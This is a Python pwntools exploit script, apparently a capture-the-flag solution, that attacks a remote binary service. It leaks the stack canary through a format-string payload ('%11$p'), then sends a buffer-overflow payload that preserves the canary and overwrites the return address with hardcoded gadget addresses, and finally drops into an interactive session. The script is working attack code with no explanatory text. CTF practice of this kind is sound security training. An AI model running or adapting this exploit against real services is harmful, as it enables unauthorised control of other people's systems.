from pwn import *

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 30):
        p = process("./main")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)

        p.recvline()
        stack_value = p.recvline()[12:-1]

        print stack_value
        p.close()
    #offset_finder()


# p = process("./main")
p = remote("dubwewsub.joints.id", 40000)

# gdb.attach(p)
p.sendline("%11$p")
p.recvline()
canary = int(p.recvline()[12:-1], 16)
# print canary
log.info("Canary: {}".format(hex(canary)))

payload = ''
payload += 'A' * 0x18
# payload += 'B' * 8
payload += p64(canary)
payload += 'B' * 8
payload += p64(0x000000000040101a)
payload += p64(0x00000000004011e8)

# gdb.attach(p, 'b *0x401299')
p.sendline(payload)

p.interactive()
